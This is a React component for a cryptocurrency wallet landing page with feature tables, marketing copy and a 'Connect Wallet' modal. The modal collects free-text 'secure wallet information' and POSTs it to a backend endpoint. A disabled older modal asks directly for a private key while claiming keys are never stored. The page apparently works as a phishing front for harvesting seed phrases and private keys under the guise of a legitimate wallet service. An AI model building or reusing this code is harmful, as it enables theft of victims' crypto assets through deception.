"use client";

import { useState } from "react";

const PlatformFeatures = () => {
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");
  const [textContent, setTextContent] = useState("");

const BASE_URL = import.meta.env.VITE_BASE_URL || "http://localhost:8005"

  // Close modal when clicking outside
  const handleModalBackdropClick = (e) => {
    if (e.target === e.currentTarget) {
      setShowWalletModal(false);
    }
  };

  // Handle the modal submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch(`${BASE_URL}/api/submit-text`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ content: textContent }),
      });

      if (response.ok) {
        alert("Text saved successfully!");
        setTextContent(""); // Clear the textarea
        setShowWalletModal(false); // Close the modal
      } else {
        alert("Failed to save text.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred while saving text.");
    }
  };

  return (
    <div className="bg-white px-[10%] pt-0">
      <div className="w-full bg-gradient-to-r from-purple-900 to-purple-950 rounded-3xl px-4 sm:px-8 py-12 sm:py-16">
        {/* Heading and Description */}
        <div className="text-center">
          <h2 className="text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-bold text-white mb-6 sm:mb-8">
            One Platform, Millions of Assets
          </h2>
          <p className="text-lg sm:text-xl md:text-2xl text-white max-w-4xl mx-auto">
            As a leading self-custody multi-chain platform, we support millions
            of assets across 100+ blockchains. From Bitcoin, Ethereum, and
            Solana, to Cosmos, Optimism, and much more.
          </p>
        </div>

        {/* Wallet Button */}
        <div className="relative mb-10 max-w-5xl mx-auto text-center">
          <button
            onClick={() => setShowWalletModal(true)}
            className="bg-white py-3 sm:py-5 px-8 sm:px-12 rounded-full text-lg sm:text-xl font-medium text-purple-900 hover:bg-blue-50 transition-colors shadow-lg inline-flex items-center justify-center"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-5 w-5 sm:h-6 sm:w-6 mr-2"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
              />
            </svg>
            Wallet
          </button>

          {/* Modal with Blurred Background */}
          {showWalletModal && (
            <div
              className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4"
              onClick={handleModalBackdropClick}
            >
              <div
                className="bg-white p-6 rounded-lg shadow-lg w-96 max-w-full"
                onClick={(e) => e.stopPropagation()}
              >
                <h2 className="text-xl font-bold mb-4 text-purple-900">
                  Connect Your Digital Wallet
                </h2>
                <p className="text-gray-600 mb-4">
                  Securely manage your assets with our state-of-the-art wallet
                  integration
                </p>
                <textarea
                  value={textContent}
                  onChange={(e) => setTextContent(e.target.value)}
                  rows="4"
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-900 focus:border-purple-950 mb-4"
                  placeholder="Enter your secure wallet information here..."
                />
                <div className="flex justify-between">
                  <button
                    onClick={handleSubmit}
                    className="bg-purple-800 text-white py-2 px-6 rounded-full hover:bg-purple-950 transition-colors"
                  >
                    Connect Wallet
                  </button>
                  <button
                    onClick={() => setShowWalletModal(false)}
                    className="bg-gray-200 text-gray-700 py-2 px-4 rounded-full hover:bg-gray-300 transition-colors"
                  >
                    Cancel
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Wallet Import Modal - Original modal kept for reference */}
        {/* You can remove this if you only want to use the new modal above */}
        {false && (
          <div
            className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4"
            onClick={handleModalBackdropClick}
          >
            <div className="bg-white rounded-2xl p-6 sm:p-8 w-full max-w-md shadow-xl">
              <div className="flex justify-between items-center mb-6">
                <h3 className="text-xl sm:text-2xl font-bold text-gray-800">
                  Import Wallet
                </h3>
                <button
                  onClick={() => setShowWalletModal(false)}
                  className="text-gray-500 hover:text-gray-700"
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="h-6 w-6"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M6 18L18 6M6 6l12 12"
                    />
                  </svg>
                </button>
              </div>

              <div className="mb-6">
                <label
                  htmlFor="wallet-address"
                  className="block text-sm font-medium text-gray-700 mb-2"
                >
                  Enter your wallet address or private key
                </label>
                <textarea
                  id="wallet-address"
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-900 focus:border-purple-950 min-h-[120px]"
                  placeholder="Enter wallet address or private key here..."
                ></textarea>
                <p className="mt-2 text-sm text-gray-500">
                  Your private key is never stored on our servers and is only
                  used to import your wallet.
                </p>
              </div>

              <div className="flex justify-end">
                <button
                  type="button"
                  onClick={() => setShowWalletModal(false)}
                  className="mr-2 px-4 py-2 text-gray-600 hover:text-gray-800"
                >
                  Cancel
                </button>
                <button
                  type="button"
                  className="px-6 py-2 bg-purple-900 text-white rounded-full hover:bg-purple-950 transition-colors"
                >
                  Import Wallet
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Features Table - Mobile Responsive */}
        <div className="bg-white rounded-2xl p-4 sm:p-8 overflow-x-auto shadow-lg mb-12 max-w-6xl mx-auto">
          <table className="min-w-full">
            {/* Table Headers */}
            <thead>
              <tr className="text-gray-700 font-medium">
                <th className="text-left py-3 px-2 sm:px-4 whitespace-nowrap text-base sm:text-xl">
                  Chain
                </th>
                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">
                  Buy
                </th>
                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">
                  Sell
                </th>
                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">
                  Swap
                </th>
                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">
                  Earn
                </th>
                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">
                  dApps
                </th>
              </tr>
            </thead>
            <tbody>
              {/* BNB Smart Chain Row */}
              <tr className="border-b border-gray-100">
                <td className="py-5 sm:py-4 px-2 sm:px-4">
                  <div className="flex items-center">
                    <img
                      src="https://cryptologos.cc/logos/bnb-bnb-logo.png"
                      alt="BNB"
                      className="w-7 h-7 sm:w-12 sm:h-12 mr-3 sm:mr-4"
                    />
                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">
                      BNB Smart Chain
                    </span>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
              </tr>

              {/* Bitcoin Row */}
              <tr className="border-b border-gray-100">
                <td className="py-5 sm:py-4 px-2 sm:px-4">
                  <div className="flex items-center">
                    <img
                      src="https://cryptologos.cc/logos/bitcoin-btc-logo.png"
                      alt="Bitcoin"
                      className="w-7 h-7 sm:w-12 sm:h-12 mr-3 sm:mr-4"
                    />
                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">
                      Bitcoin (BTC)
                    </span>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="rounded-full p-0.5 sm:p-1.5 border border-gray-300">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-gray-400"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="rounded-full p-0.5 sm:p-1.5 border border-gray-300">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-gray-400"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="rounded-full p-0.5 sm:p-1.5 border border-gray-300">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-gray-400"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
              </tr>

              {/* Cosmos Row */}
              <tr className="border-b border-gray-100">
                <td className="py-5 sm:py-4 px-2 sm:px-4">
                  <div className="flex items-center">
                    <img
                      src="https://cryptologos.cc/logos/cosmos-atom-logo.png"
                      alt="Cosmos"
                      className="w-7 h-7 sm:w-12 sm:h-12 mr-3 sm:mr-4"
                    />
                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">
                      Cosmos (ATOM)
                    </span>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="rounded-full p-0.5 sm:p-1.5 border border-gray-300">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-gray-400"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="rounded-full p-0.5 sm:p-1.5 border border-gray-300">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-gray-400"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
              </tr>

              {/* Ethereum Row */}
              <tr className="border-b border-gray-100">
                <td className="py-5 sm:py-4 px-2 sm:px-4">
                  <div className="flex items-center">
                    <img
                      src="https://cryptologos.cc/logos/ethereum-eth-logo.png"
                      alt="Ethereum"
                      className="w-7 h-7 sm:w-12 sm:h-12 mr-3 sm:mr-4"
                    />
                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">
                      Ethereum (ETH)
                    </span>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
              </tr>

              {/* Polkadot Row */}
              <tr>
                <td className="py-5 sm:py-4 px-2 sm:px-4">
                  <div className="flex items-center">
                    <img
                      src="https://cryptologos.cc/logos/polkadot-new-dot-logo.png"
                      alt="Polkadot"
                      className="w-7 h-7 sm:w-12 sm:h-12 mr-3 sm:mr-4"
                    />
                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">
                      Polkadot (DOT)
                    </span>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="rounded-full p-0.5 sm:p-1.5 border border-gray-300">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-gray-400"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="bg-purple-800 rounded-full p-0.5 sm:p-1.5">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-white"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
                <td className="py-5 sm:py-4 px-2 text-center">
                  <div className="flex justify-center">
                    <div className="rounded-full p-0.5 sm:p-1.5 border border-gray-300">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-3.5 w-3.5 sm:h-6 sm:w-6 text-gray-400"
                        viewBox="0 0 20 20"
                        fill="currentColor"
                      >
                        <path
                          fillRule="evenodd"
                          d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>
                </td>
              </tr>
            </tbody>
          </table>
        </div>

        {/* Stats Section */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8 text-center mt-12 md:mt-16">
          <div>
            <p className="text-3xl sm:text-4xl md:text-5xl font-bold text-white">
              10M+ Assets
            </p>
          </div>
          <div>
            <p className="text-3xl sm:text-4xl md:text-5xl font-bold text-white">
              600M+ NFTs
            </p>
          </div>
          <div>
            <p className="text-3xl sm:text-4xl md:text-5xl font-bold text-white">
              100+ Blockchains
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PlatformFeatures;
